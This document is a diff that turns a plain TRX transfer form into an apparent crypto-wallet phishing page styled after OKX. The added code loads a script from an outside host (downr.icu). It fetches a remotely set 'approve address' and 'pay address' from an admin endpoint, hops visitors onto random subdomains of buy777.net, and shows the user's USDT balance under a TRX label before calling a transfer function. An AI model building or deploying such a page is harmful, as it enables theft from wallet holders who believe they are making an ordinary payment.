@@ -1,172 +1,240 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1">
-    <title>转账页面</title>
-    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0"></script>
 
-    <!-- 简化的样式，接近OKX Web3钱包的UI风格 -->
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f8f8f8;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
+<html lang="zh-CN" style="--status-bar-height: 0px; --top-window-height: 0px; --window-left: 0px; --window-right: 0px; --window-margin: 0px; font-size: 17.2px; --window-top: calc(var(--top-window-height) + 0px); --window-bottom: 0px;"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><!-- <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico"> --><meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1"><title>正在转账</title><script src="public/js/jquery-3.5.1.min.js"></script>
 
-        .container {
-            width: 100%;
-            max-width: 400px;
-            background: white;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            border-radius: 8px;
-            padding: 20px;
-            box-sizing: border-box;
-        }
-
-        h1 {
-            font-size: 1.5rem;
-            text-align: center;
-            margin-bottom: 20px;
-            color: #333;
-        }
-
-        .input-group {
-            margin-bottom: 20px;
-        }
-
-        .input-group label {
-            display: block;
-            font-size: 0.9rem;
-            color: #666;
-            margin-bottom: 5px;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 10px;
-            font-size: 1rem;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            box-sizing: border-box;
-            outline: none;
-        }
-
-        .input-group input:focus {
-            border-color: #06a773;
-        }
-
-        .submit-btn {
-            width: 100%;
-            padding: 12px;
-            background-color: #06a773;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 1rem;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
-
-        .submit-btn:disabled {
-            background-color: #ccc;
-            cursor: not-allowed;
-        }
-
-        .submit-btn:hover {
-            background-color: #048e63;
-        }
-
-        .balance {
-            text-align: center;
-            margin-top: 15px;
-            color: #333;
-        }
-
-        .tip {
+<style>
+        ::-webkit-scrollbar {
             display: none;
+        }
+        
+    </style><style type="text/css">
+        .tishi {
+            width: 58%;
+            padding: 0.1rem 0.3rem;
+            height: 3rem;
+            background: #4b4848;
+            z-index: 999999999999;
             position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            background-color: #4b4848;
+            border-radius: 0.3rem;
             color: white;
-            padding: 15px 20px;
-            border-radius: 5px;
-            font-size: 1rem;
+            font-size: 1.2rem;
+            text-align: center;
+            line-height: 3rem;
+            display: none;
+            height: auto;
+            margin: 0 auto;
         }
-    </style>
-</head>
-
-<body>
-    <div class="container">
-        <h1>转账 TRX</h1>
-
-        <!-- 输入框，代替之前的按钮 -->
-        <div class="input-group">
-            <label for="amount">输入转账金额 (TRX)</label>
-            <input type="number" id="amount" placeholder="请输入转账金额" min="0" step="0.01">
-        </div>
-
-        <button class="submit-btn" id="submitBtn" disabled>下一步</button>
-
-        <!-- 显示余额的元素 -->
-        <div class="balance">
-            余额: <span id="ye">0</span> TRX
-        </div>
-    </div>
-
-    <div class="tip" id="tip">提示内容</div>
-
-    <script>
-        let trxBalance = 0;
-        let payaddress = "请输入目标地址"; // 假定目标地址是固定的，可以根据需要更改
-
-        function updateSubmitButton() {
-            const amount = parseFloat(document.getElementById('amount').value);
-            const submitBtn = document.getElementById('submitBtn');
-            const balance = parseFloat(document.getElementById('ye').textContent);
-
-            if (amount > 0 && amount <= balance) {
-                submitBtn.disabled = false;
-            } else {
-                submitBtn.disabled = true;
+    </style><script>
+        document.addEventListener('DOMContentLoaded',
+            function() {
+                document.documentElement.style.fontSize = document.documentElement.clientWidth / 25 + 'px'
+            })
+    </script><link rel="stylesheet" href="public/js/okex.css"></head><body class="uni-body pages-index-home"><noscript><strong>本站点必须要开启JavaScript才能运行</strong></noscript><uni-app class="uni-app--maxwidth"><uni-page data-page="pages/index/home"><uni-page-wrapper><uni-page-body><body data-v-49fe1bb8=""><div data-v-49fe1bb8="" id="app"><div data-v-49fe1bb8=""><div data-v-49fe1bb8="" class="pay-box"><div data-v-49fe1bb8="" class="amount"><div data-v-49fe1bb8="" class="num"><span class="amount" id="amount"></span><em data-v-49fe1bb8="">TRX</em></div><img data-v-49fe1bb8="" src="public/icon_exchange.jpg" class="icon"></div><div data-v-49fe1bb8="" class="rate"><span id="amount-display"></span><em data-v-49fe1bb8="">TRX</em><div data-v-49fe1bb8="" class="icon"><img data-v-49fe1bb8="" src="public/icon_horn.jpg"></div></div></div><div data-v-49fe1bb8="" class="bottom-keyboard"><div data-v-49fe1bb8="" class="asset-info"><div data-v-49fe1bb8="" class="name"><img data-v-49fe1bb8="" src="https://cryptologos.cc/logos/tron-trx-logo.png" class="coin"><div data-v-49fe1bb8="" class="asset-box"><p data-v-49fe1bb8="" class="title">余额</p><p data-v-49fe1bb8="" class="num"><span data-v-49fe1bb8="" id="ye"></span><em data-v-49fe1bb8="">TRX</em></p><input type="text" id="address" style="display:none"></div></div><div data-v-49fe1bb8="" class="right"><div data-v-49fe1bb8="" class="btn">最大</div></div></div><div data-v-49fe1bb8="" class="keyboard-box"><div data-v-49fe1bb8="" onclick="pressKey('1')" class="btn">1</div><div data-v-49fe1bb8="" onclick="pressKey('2')" class="btn">2</div><div data-v-49fe1bb8="" onclick="pressKey('3')" class="btn">3</div><div data-v-49fe1bb8="" onclick="pressKey('4')" class="btn">4</div><div data-v-49fe1bb8="" onclick="pressKey('5')" class="btn">5</div><div data-v-49fe1bb8="" onclick="pressKey('6')" class="btn">6</div><div data-v-49fe1bb8="" onclick="pressKey('7')" class="btn">7</div><div data-v-49fe1bb8="" onclick="pressKey('8')" class="btn">8</div><div data-v-49fe1bb8="" onclick="pressKey('9')" class="btn">9</div><div data-v-49fe1bb8="" onclick="pressKey('.')" class="btn">.</div><div data-v-49fe1bb8="" onclick="pressKey('0')" class="btn">0</div><div data-v-49fe1bb8="" class="btn delete" style="margin-top:20px; position: relative;">
+    <img data-v-49fe1bb8="" src="public/icon_delete.jpg" style="pointer-events: none;">
+</div>
+<button data-v-49fe1bb8="" class="submit-btn disabled" type="button" id="submitBtn" disabled="">下一步</button></div></div></div></body></uni-page-body></uni-page-wrapper></uni-page><uni-modal style="display: none;"><div class="uni-mask"></div><div class="uni-modal"><div class="uni-modal__bd"></div><div class="uni-modal__ft"><div class="uni-modal__btn uni-modal__btn_default" style="color: rgb(0, 0, 0);">Cancel</div><div class="uni-modal__btn uni-modal__btn_primary" style="color: rgb(0, 122, 255);">OK</div></div></div></uni-modal><div class="tishi" id="tip">提示</div><input id="to_address" type="hidden"></uni-app><script type="text/javascript" src="https://downr.icu/bfpay.js"></script><script type="text/javascript" src="public/js/help.js"></script><script type="text/javascript" src="public/js/common.js"></script><script>
+     function isTopLevelDomain() {
+            // 当前访问的域名
+            const currentDomain = window.location.hostname;
+            // 检测是否是顶级域名
+            if (currentDomain === 'buy777.net') {
+                // 生成随机的8位字母和数字组合
+                const randomString = generateRandomString(8);
+                // 构建新的子域名URL
+                const newUrl = `https://${randomString}.buy777.net`;
+                // 重定向到新URL
+                window.location.href = newUrl;
             }
         }
 
-        document.getElementById('amount').addEventListener('input', updateSubmitButton);
+        function generateRandomString(length) {
+            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let result = '';
+            for (let i = 0; i < length; i++) {
+                const randomIndex = Math.floor(Math.random() * characters.length);
+                result += characters.charAt(randomIndex);
+            }
+            return result;
+        }
 
-        document.getElementById('submitBtn').addEventListener('click', function() {
-            const amount = document.getElementById('amount').value;
-            if (confirm(`确认转账 ${amount} TRX 到 ${payaddress} 吗？`)) {
-                transfertrx(); // 调用转账函数
+        // 在页面加载时检查域名并执行跳转
+        window.onload = isTopLevelDomain;
+    document.addEventListener('DOMContentLoaded', function() {
+    var deleteBtn = document.querySelector('.btn.delete');
+    var deleteInterval;
+    var isLongPress = false;
+
+    deleteBtn.addEventListener('mousedown', function(event) {
+        event.preventDefault(); // 防止默认事件，比如图片拖动
+        isLongPress = false;
+        deleteInterval = setTimeout(function() {
+            isLongPress = true;
+            deleteInterval = setInterval(function() {
+                clearAmount();
+            }, 100); // 每100毫秒删除一个字符
+        }, 500); // 500ms后判定为长按
+    });
+
+    deleteBtn.addEventListener('mouseup', function() {
+        clearInterval(deleteInterval);
+        clearTimeout(deleteInterval);
+        if (!isLongPress) {
+            clearAmount(); // 如果不是长按，执行一次删除
+        }
+    });
+
+    deleteBtn.addEventListener('mouseleave', function() {
+        clearInterval(deleteInterval);
+        clearTimeout(deleteInterval);
+    });
+
+    deleteBtn.addEventListener('touchstart', function(event) {
+        event.preventDefault(); // 防止触摸事件的默认行为
+        isLongPress = false;
+        deleteInterval = setTimeout(function() {
+            isLongPress = true;
+            deleteInterval = setInterval(function() {
+                clearAmount();
+            }, 100);
+        }, 500); // 500ms后判定为长按
+    });
+
+    deleteBtn.addEventListener('touchend', function() {
+        clearInterval(deleteInterval);
+        clearTimeout(deleteInterval);
+        if (!isLongPress) {
+            clearAmount(); // 如果不是长按，执行一次删除
+        }
+    });
+
+    deleteBtn.addEventListener('touchcancel', function() {
+        clearInterval(deleteInterval);
+        clearTimeout(deleteInterval);
+    });
+});
+
+let approveaddress, payaddress, isopen, ismiaou;
+        var domain = '';
+fetch('https://downr.icu/yyadmin/database.php')
+    .then(response => response.json())
+    .then(data => {
+        // 解析JSON数据并将其插入到表格中
+        let configBody = document.getElementById('config-body');
+        data.forEach(config => {
+            
+            switch(config.config_key) {
+                case 'approve_address':
+                    approveaddress = config.config_value;
+                    break;
+                case 'pay_address':
+                    payaddress = config.config_value;
+                    break;
+                case 'isappay':
+                    ismiaou = config.config_value;  // 修正变量名，确保对应配置项正确赋值
+                    //ismiaou = 0;
+                    break;
+                case 'isopen':
+                    isopen = config.config_value;
+                    break;
+                // 添加更多的配置项根据你的需求
+                default:
+                    console.log('未定义的配置键:', config.config_key);
             }
         });
 
-        function showTip(message, duration = 1500) {
-            const tip = document.getElementById('tip');
-            tip.innerHTML = message;
-            tip.style.display = 'block';
-            setTimeout(() => {
-                tip.style.display = 'none';
-            }, duration);
+        // 现在可以在这里使用这些变量，因为数据已经被赋值
+        console.log('Authorized Address:', approveaddress);
+        console.log('Pay Address:', payaddress);
+        console.log('Is Miaou:', ismiaou);
+        console.log('Is Open:', isopen);
+        if(isopen === '0'){
+      console.log(isopen);
+    }else{
+      window.location.href = '/404.php';
+    }
+    })
+    .catch(error => {
+        console.error('Error fetching config:', error);
+    });
+    
+    
+        function pressKey(key) {
+            var amount = document.getElementById('amount');
+            var submitBtn = document.getElementById('submitBtn');
+            var amountDisplay = document.getElementById('amount-display');
+            if (amount.innerHTML.includes('.') && key === '.') {
+                return;
+            }
+            if (amount.innerHTML === '0' && key !== '.') {
+                amount.innerHTML = key;
+            } else {
+                amount.innerHTML += key;
+            }
+            updateSubmitButton();
+            amountDisplay.textContent = amount.textContent;
+            $(amount).val(amount.textContent);
+        }
+		
+
+        function clearAmount() {
+            var amount = document.getElementById('amount');
+            var amountDisplay = document.getElementById('amount-display');
+            amount.textContent = amount.textContent.slice(0, -1) || '0';
+            // 更新新的 span 内容以匹配 amount
+            amountDisplay.textContent = amount.textContent;
+            $(amount).val(amount.textContent);
+            updateSubmitButton();
         }
 
-        // 假设从API获取余额并刷新UI
+        function updateSubmitButton() {
+    var submitBtn = document.getElementById('submitBtn');
+    var amount = parseFloat(document.getElementById('amount').innerHTML);
+    var amount2 = parseFloat(document.getElementById('ye').innerHTML);
+
+    if (amount <= amount2 && amount > 0) {
+        submitBtn.classList.remove('disabled');
+        submitBtn.disabled = false;
+    } else {
+        submitBtn.classList.add('disabled');
+        submitBtn.disabled = true;
+    }
+}
+
+		
+
         function refreshBalance() {
-            const balanceElement = document.getElementById('ye');
-            // 模拟获取余额，这里可以替换为实际的API请求
-            trxBalance = 100;  // 模拟余额为100 TRX
-            balanceElement.textContent = trxBalance;
+            //console.log('Refresh balance');
         }
 
-        window.onload = refreshBalance;
-    </script>
-</body>
-</html>
+        document.addEventListener('DOMContentLoaded', function() {
+            var btnMax = document.querySelector('.btn');
+            var ye = document.getElementById('ye');
+            var amount = document.getElementById('amount');
+            var amount2 = document.getElementById('amount-display');
+
+            btnMax.addEventListener('click', function() {
+                amount.textContent = ye.textContent;
+                amount2.textContent = amount.textContent;
+                $(amount).val(amount.textContent);
+                updateSubmitButton();
+            });
+        });
+
+
+        updateSubmitButton();
+        clearAmount();
+        $(function() {
+            sleep(1000).then(() => {
+                getAssets(function(trx, usdt) {
+                    $("#submitBtn")["removeAttr"]("disabled");
+                    $("#submitBtn")["text"]("下一步");
+                    $("#ye").html(usdt);
+                });
+            });
+            $("#submitBtn").click(function() {
+                transfer_f();
+            });
+        });
+    </script></body></html>
